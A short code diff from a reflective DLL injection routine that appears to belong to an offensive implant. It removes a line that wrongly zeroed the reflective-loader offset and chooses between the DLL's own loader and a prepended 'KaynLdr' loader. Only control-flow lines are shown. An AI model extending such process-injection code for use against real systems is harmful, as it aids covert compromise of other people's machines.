@@ -199,17 +199,12 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         }
     }
 
-    ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer );
-    ReflectiveLdrOffset = 0;
-    if ( ReflectiveLdrOffset )
-    {
+    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
         PUTS( "The DLL has a Reflective Loader already defined" );
         HasRDll     = TRUE;
         FullDll     = DllBuffer;
         FullDllSize = DllLength;
-    }
-    else
-    {
+    } else {
         PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
         HasRDll     = FALSE;
         FullDll     = Instance.Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
